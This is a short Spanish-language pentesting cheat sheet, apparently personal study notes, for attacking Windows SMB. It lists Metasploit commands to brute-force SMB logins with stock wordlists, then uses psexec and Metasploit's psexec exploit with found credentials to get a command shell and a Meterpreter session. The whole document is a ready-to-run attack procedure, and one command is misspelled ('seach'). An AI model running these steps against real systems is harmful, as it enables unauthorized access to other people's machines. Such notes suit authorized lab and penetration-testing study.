--------
- tags: #smb #windows #bruteforce #psexec #metasploit #meterpreter 
---------

### Ataque de fuerza bruta con Metasploit

	msfdb run
	use auxiliary/scanner/smb/smb_login
	set RHOSTS x.x.x.x
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set VERBOSE false
	run

### Autenticarse con psexec

	psexec Administrator@x.x.x.x cmd.exe
(pedirá la contraseña al ejecutarlo)

### Autenticarse con el psexec de Metasploit (meterpreter session)

	seach psexec 
	use exploit/windows/smb/psexec
	set RHOSTS x.x.x.x
	set SMBUser Administrator
	set SMBPass 123456789
	exploit
	